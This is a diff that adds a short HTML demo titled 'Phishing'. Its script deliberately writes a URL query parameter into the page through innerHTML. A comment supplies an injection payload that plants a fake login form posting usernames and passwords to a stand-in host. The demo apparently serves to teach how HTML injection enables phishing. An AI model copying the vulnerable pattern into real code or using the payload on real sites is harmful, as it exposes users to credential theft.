@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Phishing</title>
+    <style>
+
+    </style>
+</head>
+<body>
+    <!-- Vulnerable code -->
+    <div id="example-div"></div>
+
+    <!-- insert this in the url as query param -->
+    <!-- Injects a html form which looks a part of website, then user enters creds on it and sneds it to the hacker's enpoint -->
+    <!-- ?name=<h3>Please login to proceed</h3> <form action="http://example.com/fakepage.php">Username:<br/>
+<input type="username"name="username"/><br/>Password:<br/><input type="password"name="passwor
+d"/><br/><input type="submit"name="Login"/><br/></form> -->
+
+    <!-- Vulnerable code -->
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const name = params.get('name');
+        document.getElementById('example-div').innerHTML = `${name}`;
+    </script>
+
+</body>
+</html>
